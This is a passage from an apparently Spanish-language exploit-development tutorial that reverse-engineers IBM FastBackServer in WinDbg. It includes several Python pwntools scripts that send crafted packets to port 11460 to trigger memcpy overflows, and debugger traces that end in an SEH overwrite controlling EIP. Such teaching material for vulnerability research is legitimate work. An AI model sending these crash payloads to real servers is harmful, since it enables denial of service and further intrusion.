<a href="/exploit-development/windows-user/reverse-engineering/26.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/26.png"></p></div></a>

<p class="plain-text">Este bloque llama a <code class="language-plaintext highlighter-rouge">MEM_S_GetChunk</code>, este no pasa un argumento que controlemos por lo que lo omitimos, podemos entender que se utiliza para asignar memoria</p>
<a href="/exploit-development/windows-user/reverse-engineering/27.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/27.png"></p></div></a>


<a href="/exploit-development/windows-user/reverse-engineering/28.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/28.png"></p></div></a>

<a href="/exploit-development/windows-user/reverse-engineering/29.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/29.png"></p></div></a>

<a href="/exploit-development/windows-user/reverse-engineering/30.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/30.png"></p></div></a>

<a href="/exploit-development/windows-user/reverse-engineering/31.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/31.png"></p></div></a>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">r
eax=00000034 ebx=05c9b3b8 ecx=04d4a48c edx=06ccdc0c esi=05c9b3b8 edi=00669360  
eip=0056a18a esp=0e5ffe9c ebp=0e5ffeb4 iopl=0         nv up ei pl nz na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206  
FastBackServer!FXCLI_C_ReceiveCommand+0x9b:
0056a18a e8b1cc0f00      call    FastBackServer!memcpy (00666e40)

</span><span class="ro">0:000></span><span class="p"> dds esp L3
0e5ffe9c  06ccdc0c
0e5ffea0  04d4a48c
0e5ffea4  00000034

</span><span class="ro">0:000></span><span class="p"> db poi(esp + 4) - 0x30
04d4a45c  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
04d4a46c  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
04d4a47c  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
04d4a48c  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
04d4a49c  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
04d4a4ac  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
04d4a4bc  41 41 41 41 00 00 00 00-00 00 00 00 00 00 00 00  AAAA............
04d4a4cc  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................</span>
</code></pre></div></div><br>

<a href="/exploit-development/windows-user/reverse-engineering/32.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/32.png"></p></div></a>

<a href="/exploit-development/windows-user/reverse-engineering/33.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/33.png"></p></div></a>

<a href="/exploit-development/windows-user/reverse-engineering/34.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/34.png"></p></div></a>

<a href="/exploit-development/windows-user/reverse-engineering/35.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/35.png"></p></div></a>

<a href="/exploit-development/windows-user/reverse-engineering/36.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/36.png"></p></div></a>

<a href="/exploit-development/windows-user/reverse-engineering/37.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/37.png"></p></div></a>

<a href="/exploit-development/windows-user/reverse-engineering/38.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/38.png"></p></div></a>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="mi"> *</span><span class="p">

payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x64</span><span class="p">, endian</span><span class="o">=</span><span class="s">"big"</span><span class="p">)  
payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="mi"> 0x30</span><span class="p">
payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"B"</span><span class="o"> *</span><span class="mi"> 0x34</span><span class="p">

shell</span><span class="o"> =</span><span class="p"> remote(</span><span class="s">"Windows"</span><span class="p">, </span><span class="mi">11460</span><span class="p">)
shell.send(payload)</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> bp FastBackServer!FXCLI_OraBR_Exec_Command

</span><span class="ro">0:000></span><span class="p"> g
Breakpoint 0 hit
eax=0cf91020 ebx=05d3b6c8 ecx=05d429f8 edx=05d3c8e8 esi=05d3b6c8 edi=00669360  
eip=0056c4b6 esp=0d29fe9c ebp=0d29feb4 iopl=0         nv up ei pl nz na po nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202  
FastBackServer!FXCLI_OraBR_Exec_Command:
0056c4b6 55              push    ebp</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> r
eax=05d3c8f8 ebx=05d3b6c8 ecx=05d3c8e8 edx=06ec6c0c esi=05d3b6c8 edi=00669360
eip=0056c82b esp=0d23e334 ebp=0d29fe98 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
FastBackServer!FXCLI_OraBR_Exec_Command+0x375:
0056c82b 817804a8610000  cmp     dword ptr [eax+4],61A8h ds:0023:05d3c8fc=41414141  

</span><span class="ro">0:000></span><span class="p"> dd eax - 0x20 L10
05d3c8d8  00000000 00000000 00000000 00000000
05d3c8e8  41414141 41414141 0cf91020 41414141
05d3c8f8  41414141 41414141 41414141 41414141
05d3c908  41414141 41414141 41414141 06ec6c08</span>
</code></pre></div></div><br>

<a href="/exploit-development/windows-user/reverse-engineering/39.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/39.png"></p></div></a>

<a href="/exploit-development/windows-user/reverse-engineering/40.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/40.png"></p></div></a>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> p
eax=05d3c8f8 ebx=05d3b6c8 ecx=05d3c8e8 edx=06ec6c0c esi=05d3b6c8 edi=00669360
eip=0056c832 esp=0d23e334 ebp=0d29fe98 iopl=0         nv up ei ng nz ac po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000293
FastBackServer!FXCLI_OraBR_Exec_Command+0x37c:
0056c832 731e            jae     FastBackServer!FXCLI_OraBR_Exec_Command+0x39c (0056c852) [br=0]  </span>
</code></pre></div></div><br>

<a href="/exploit-development/windows-user/reverse-engineering/41.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/41.png"></p></div></a>

<a href="/exploit-development/windows-user/reverse-engineering/42.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/42.png"></p></div></a>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> ed ecx + 0xc 0x2000

</span><span class="ro">0:000></span><span class="p"> r
eax=05d3c8f8 ebx=05d3b6c8 ecx=05d3c8f8 edx=06ec6c0c esi=05d3b6c8 edi=00669360
eip=0056c83a esp=0d23e334 ebp=0d29fe98 iopl=0         nv up ei ng nz ac po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000293
FastBackServer!FXCLI_OraBR_Exec_Command+0x384:
0056c83a 81790ca8610000  cmp     dword ptr [ecx+0Ch],61A8h ds:0023:05d3c904=00002000

</span><span class="ro">0:000></span><span class="p"> p
eax=05d3c8f8 ebx=05d3b6c8 ecx=05d3c8f8 edx=06ec6c0c esi=05d3b6c8 edi=00669360
eip=0056c841 esp=0d23e334 ebp=0d29fe98 iopl=0         nv up ei ng nz ac po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000293
FastBackServer!FXCLI_OraBR_Exec_Command+0x38b:
0056c841 730f            jae     FastBackServer!FXCLI_OraBR_Exec_Command+0x39c (0056c852) [br=0]  

</span><span class="ro">0:000></span><span class="p"> p
eax=05d3c8f8 ebx=05d3b6c8 ecx=05d3c8f8 edx=06ec6c0c esi=05d3b6c8 edi=00669360
eip=0056c843 esp=0d23e334 ebp=0d29fe98 iopl=0         nv up ei ng nz ac po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000293
FastBackServer!FXCLI_OraBR_Exec_Command+0x38d:
0056c843 8b954c9effff    mov     edx,dword ptr [ebp-61B4h] ss:0023:0d299ce4=05d3c8f8

</span><span class="ro">0:000></span><span class="p"> p
eax=05d3c8f8 ebx=05d3b6c8 ecx=05d3c8f8 edx=05d3c8f8 esi=05d3b6c8 edi=00669360
eip=0056c849 esp=0d23e334 ebp=0d29fe98 iopl=0         nv up ei ng nz ac po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000293
FastBackServer!FXCLI_OraBR_Exec_Command+0x393:
0056c849 817a04a8610000  cmp     dword ptr [edx+4],61A8h ds:0023:05d3c8fc=00001000

</span><span class="ro">0:000> </span><span class="p">p
eax=05d3c8f8 ebx=05d3b6c8 ecx=05d3c8f8 edx=05d3c8f8 esi=05d3b6c8 edi=00669360
eip=0056c850 esp=0d23e334 ebp=0d29fe98 iopl=0         nv up ei ng nz ac po cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000293
FastBackServer!FXCLI_OraBR_Exec_Command+0x39a:
0056c850 7273            jb      FastBackServer!FXCLI_OraBR_Exec_Command+0x40f (0056c8c5) [br=1]  </span>
</code></pre></div></div><br>

<a href="/exploit-development/windows-user/reverse-engineering/43.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/43.png"></p></div></a>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> dd eax
06ec6c0c  42424242 42424242 42424242 42424242  
06ec6c1c  42424242 42424242 42424242 42424242  
06ec6c2c  42424242 42424242 42424242 42424242  
06ec6c3c  42424242 00000000 00000000 00000000  
06ec6c4c  00000000 00000000 00000000 00000000  
06ec6c5c  00000000 00000000 00000000 00000000  
06ec6c6c  00000000 00000000 00000000 00000000  
06ec6c7c  00000000 00000000 00000000 00000000  

</span><span class="ro">0:000></span><span class="p"> dd edx
05d3c8f8  41414141 00001000 41414141 00002000  
05d3c908  41414141 41414141 41414141 06ec6c08  
05d3c918  1814369c 081e80aa 4c435846 534d5f49  
05d3c928  00005147 00000000 00000000 00000000  
05d3c938  00000000 00000000 00000000 00000000  
05d3c948  00000000 00000000 00000000 00000000  
05d3c958  00000000 00000000 00000000 00000000  
05d3c968  00000000 00000000 00000000 00000000  </span>
</code></pre></div></div><br>

<a href="/exploit-development/windows-user/reverse-engineering/44.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/44.png"></p></div></a>

<a href="/exploit-development/windows-user/reverse-engineering/45.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/45.png"></p></div></a>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> r
eax=482dad4d ebx=05d3b6c8 ecx=0d293b30 edx=05d3c8f8 esi=05d3b6c8 edi=00669360  
eip=0056c8f1 esp=0d23e328 ebp=0d29fe98 iopl=0         nv up ei pl nz na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206  
FastBackServer!FXCLI_OraBR_Exec_Command+0x43b:
0056c8f1 e84aa50f00      call    FastBackServer!memcpy (00666e40)

</span><span class="ro">0:000></span><span class="p"> dds esp L3
0d23e328  0d293b30
0d23e32c  482dad4d
0d23e330  00001000

</span><span class="ro">0:000></span><span class="p"> db 482dad4d
482dad4d  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
482dad5d  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
482dad6d  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
482dad7d  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
482dad8d  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
482dad9d  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
482dadad  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????
482dadbd  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????

</span><span class="ro">0:000></span><span class="p"> p
(1e2c.1e28): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=482dbd4d ebx=05d3b6c8 ecx=00000400 edx=00000000 esi=482dad4d edi=0d293b30  
eip=00666e73 esp=0d23e318 ebp=0d23e320 iopl=0         nv up ei pl nz ac po nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010212  
FastBackServer!memcpy+0x33:
00666e73 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]</span>
</code></pre></div></div><br>

</section>

<section class="post" id="seh">
<br><h3 class="post-title">SEH Overflow</h3><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="mi"> *</span><span class="p">

payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
</span><span class="c1"># Checksum</span><span class="p">
payload</span><span class="o"> =</span><span class="p"> p32(</span><span class="mi">0x630</span><span class="p">, endian</span><span class="o">=</span><span class="s">"big"</span><span class="p">)
</span><span class="c1"># psAgentCommand</span><span class="p">
payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="mi"> 0x10</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x0</span><span class="p">)</span><span class="c1">   # 1st memcpy: offset
</span><span class="p">payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x100</span><span class="p">)</span><span class="c1"> # 1st memcpy: size field
</span><span class="p">payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x100</span><span class="p">)</span><span class="c1"> # 2nd memcpy: offset
</span><span class="p">payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x200</span><span class="p">)</span><span class="c1"> # 2nd memcpy: size field
</span><span class="p">payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x300</span><span class="p">)</span><span class="c1"> # 3rd memcpy: offset
</span><span class="p">payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x300</span><span class="p">)</span><span class="c1"> # 3rd memcpy: size field
</span><span class="p">payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="mi"> 0x8</span><span class="p">
</span><span class="c1"># psCommandBuffer
</span><span class="p">payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"B"</span><span class="o"> *</span><span class="mi"> 0x100</span><span class="c1"> # 3nd buffer
</span><span class="p">payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"C"</span><span class="o"> *</span><span class="mi"> 0x200</span><span class="c1"> # 2nd buffer
</span><span class="p">payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"D"</span><span class="o"> *</span><span class="mi"> 0x300</span><span class="c1"> # 3rd buffer

</span><span class="p">shell</span><span class="o"> =</span><span class="p"> remote(</span><span class="s">"Windows"</span><span class="p">,</span><span class="mi"> 11460</span><span class="p">)
shell.send(payload)</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> bp FastBackServer!FXCLI_OraBR_Exec_Command + 0x43b

</span><span class="ro">0:000></span><span class="p"> g
Breakpoint 0 hit
eax=06bc3c0c ebx=05beacd0 ecx=0cf13b30 edx=05bec890 esi=05beacd0 edi=00669360  
eip=0056c8f1 esp=0cebe328 ebp=0cf1fe98 iopl=0         nv up ei pl nz na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206  
FastBackServer!FXCLI_OraBR_Exec_Command+0x43b:
0056c8f1 e84aa50f00      call    FastBackServer!memcpy (00666e40)

</span><span class="ro">0:000></span><span class="p"> dds esp L3
0cebe328  0cf13b30
0cebe32c  06bc3c0c
0cebe330  00000100

</span><span class="ro">0:000></span><span class="p"> db poi(esp + 4)
06bc3c0c  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
06bc3c1c  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
06bc3c2c  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
06bc3c3c  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
06bc3c4c  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
06bc3c5c  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
06bc3c6c  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
06bc3c7c  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> dds esp L3
0cebe328  0cf13b30
0cebe32c  06bc3c0c
0cebe330  00000100

</span><span class="ro">0:000></span><span class="p"> !teb
TEB at 00351000
    ExceptionList:        0cf1ff38
    StackBase:            0cf20000
    StackLimit:           0cebe000
    SubSystemTib:         00000000
    FiberData:            00001e00
    ArbitraryUserPointer: 00000000
    Self:                 00351000
    EnvironmentPointer:   00000000
    ClientId:             00001d5c . 00001e08  
    RpcHandle:            00000000
    Tls Storage:          00e1d0f0
    PEB Address:          002fa000
    LastErrorValue:       0
    LastStatusValue:      c000000d
    Count Owned Locks:    0
    HardErrorMode:        0</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> k
 # ChildEBP RetAddr      
00 0cf1fe98 0056a21f     FastBackServer!FXCLI_OraBR_Exec_Command+0x43b  
01 0cf1feb4 00581366     FastBackServer!FXCLI_C_ReceiveCommand+0x130
02 0cf1fef0 0048ca98     FastBackServer!FX_AGENT_Cyclic+0x116
03 0cf1ff48 006693e9     FastBackServer!ORABR_Thread+0xef
04 0cf1ff80 77509564     FastBackServer!_beginthreadex+0xf4
05 0cf1ff94 7774293c     KERNEL32!BaseThreadInitThunk+0x24
06 0cf1ffdc 77742910     ntdll!__RtlUserThreadStart+0x2b
07 0cf1ffec 00000000     ntdll!_RtlUserThreadStart+0x1b

</span><span class="ro">0:000></span><span class="p"> dds 0cf1fe98 L2
0cf1fe98  0cf1feb4
0cf1fe9c  0056a21f FastBackServer!FXCLI_C_ReceiveCommand+0x130

</span><span class="ro">0:000></span><span class="p"> ? 0cf13b30 < 0cf1fe9c  
Evaluate expression: 1 = 00000001

</span><span class="ro">0:000></span><span class="p"> ? 0cf1fe9c - 0cf13b30
Evaluate expression: 50028 = 0000c36c</span>
</code></pre></div></div><br>

<a href="/exploit-development/windows-user/reverse-engineering/46.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/46.png"></p></div></a>

<a href="/exploit-development/windows-user/reverse-engineering/47.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/47.png"></p></div></a>

<a href="/exploit-development/windows-user/reverse-engineering/48.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/48.png"></p></div></a>

<a href="/exploit-development/windows-user/reverse-engineering/49.png" target="_blank"><div><p><img src="/exploit-development/windows-user/reverse-engineering/48.png"></p></div></a>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> r
eax=06bc3c0c ebx=05beacd0 ecx=0cf13b30 edx=05bec890 esi=05beacd0 edi=00669360  
eip=0056c8f1 esp=0cebe328 ebp=0cf1fe98 iopl=0         nv up ei pl nz na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206  
FastBackServer!FXCLI_OraBR_Exec_Command+0x43b:
0056c8f1 e84aa50f00      call    FastBackServer!memcpy (00666e40)

</span><span class="ro">0:000></span><span class="p"> k
 # ChildEBP RetAddr      
00 0cf1fe98 0056a21f     FastBackServer!FXCLI_OraBR_Exec_Command+0x43b
01 0cf1feb4 00581366     FastBackServer!FXCLI_C_ReceiveCommand+0x130
02 0cf1fef0 0048ca98     FastBackServer!FX_AGENT_Cyclic+0x116
03 0cf1ff48 006693e9     FastBackServer!ORABR_Thread+0xef
04 0cf1ff80 77509564     FastBackServer!_beginthreadex+0xf4
05 0cf1ff94 7774293c     KERNEL32!BaseThreadInitThunk+0x24
06 0cf1ffdc 77742910     ntdll!__RtlUserThreadStart+0x2b
07 0cf1ffec 00000000     ntdll!_RtlUserThreadStart+0x1b

</span><span class="ro">0:000></span><span class="p"> dds 0cf1fe98 L2
0cf1fe98  0cf1feb4
0cf1fe9c  0056a21f FastBackServer!FXCLI_C_ReceiveCommand+0x130

</span><span class="ro">0:000></span><span class="p"> ? 0cf1fe9c - 0cf1d980
Evaluate expression: 9500 = 0000251c</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="mi"> *</span><span class="p">

payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
</span><span class="c1"># Checksum</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x2330</span><span class="p">, endian</span><span class="o">=</span><span class="s">"big"</span><span class="p">)
</span><span class="c1"># psAgentCommand</span><span class="p">
payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="mi"> 0x10</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x0</span><span class="p">)</span><span class="c1">                    # 1st memcpy: offset</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x1000</span><span class="p">)</span><span class="c1">                 # 1st memcpy: size field</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x0</span><span class="p">)</span><span class="c1">                    # 2nd memcpy: offset</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x1000</span><span class="p">)</span><span class="c1">                 # 2nd memcpy: size field</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="o">-</span><span class="mi">0x11000</span><span class="o"> &</span><span class="mi"> 0xffffffff</span><span class="p">)</span><span class="c1">  # 3rd memcpy: offset</span><span class="p">
payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x13000</span><span class="p">)</span><span class="c1">                # 3rd memcpy: size field</span><span class="p">
payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="mi"> 0x8</span><span class="p">
</span><span class="c1"># psCommandBuffer</span><span class="p">
payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"B"</span><span class="o"> *</span><span class="mi"> 0x100</span><span class="c1">  # 3nd buffer</span><span class="p">
payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"C"</span><span class="o"> *</span><span class="mi"> 0x200</span><span class="c1">  # 2nd buffer</span><span class="p">
payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"D"</span><span class="o"> *</span><span class="mi"> 0x2000</span><span class="c1"> # 3rd buffer</span><span class="p">

shell</span><span class="o"> =</span><span class="p"> remote(</span><span class="s">"Windows"</span><span class="p">,</span><span class="mi"> 11460</span><span class="p">)
shell.send(payload)</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> bp FastBackServer!FXCLI_OraBR_Exec_Command + 0x4c7

</span><span class="ro">0:000></span><span class="p"> g
Breakpoint 0 hit
eax=05aec890 ebx=05aea808 ecx=06a9ac0c edx=0cf1d980 esi=05aea808 edi=00669360  
eip=0056c97d esp=0cece328 ebp=0cf2fe98 iopl=0         nv up ei pl nz na pe cy  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000207  
FastBackServer!FXCLI_OraBR_Exec_Command+0x4c7:
0056c97d e8bea40f00      call    FastBackServer!memcpy (00666e40)

</span><span class="ro">0:000></span><span class="p"> dds esp L3
0cece328  0cf1d980
0cece32c  06a9ac0c
0cece330  00013000

</span><span class="ro">0:000></span><span class="p"> db poi(esp + 4)
06a9ac0c  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
06a9ac1c  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
06a9ac2c  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
06a9ac3c  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
06a9ac4c  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
06a9ac5c  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
06a9ac6c  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
06a9ac7c  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................

</span><span class="ro">0:000> </span><span class="p">db poi(esp + 4) + 0x11000
06aabc0c  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
06aabc1c  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
06aabc2c  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
06aabc3c  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
06aabc4c  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
06aabc5c  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
06aabc6c  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB
06aabc7c  42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42  BBBBBBBBBBBBBBBB</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> !exchain
0cf2ff38: FastBackServer!_except_handler3+0 (00667de4)
  CRT scope  1, filter: FastBackServer!ORABR_Thread+fb (0048caa4)
                func:   FastBackServer!ORABR_Thread+10d (0048cab6)
0cf2ff70: FastBackServer!_except_handler3+0 (00667de4)
  CRT scope  0, filter: FastBackServer!_beginthreadex+112 (00669407)
                func:   FastBackServer!_beginthreadex+126 (0066941b)
0cf2ffcc: ntdll!_except_handler4+0 (77777390)
  CRT scope  0, filter: ntdll!__RtlUserThreadStart+40 (77742951)
                func:   ntdll!__RtlUserThreadStart+7c (7774298d)
0cf2ffe4: ntdll!FinalExceptionHandlerPad41+0 (77783c79)
Invalid exception stack at ffffffff

</span><span class="ro">0:000></span><span class="p"> p
(808.17f4): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=06aadc0c ebx=05aea808 ecx=00000260 edx=00000000 esi=06aad28c edi=0cf30000  
eip=00666e73 esp=0cece318 ebp=0cece320 iopl=0         nv up ei pl nz ac po nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010212  
FastBackServer!memcpy+0x33:
00666e73 f3a5            rep movs dword ptr es:[edi],dword ptr [esi]</span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000></span><span class="p"> !exchain
0cf2ff38: 44444444
Invalid exception stack at 44444444

</span><span class="ro">0:000></span><span class="p"> p
(808.17f4): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=44444444 edx=77783b20 esi=00000000 edi=00000000  
eip=44444444 esp=0cecddb8 ebp=0cecddd8 iopl=0         nv up ei pl zr na pe nc  
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246  
44444444 ??              ???</span>
</code></pre></div></div><br>

</section>

<section class="post" id="stack">
<br><h3 class="post-title">Stack Overflow</h3><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3</span><span class="p">
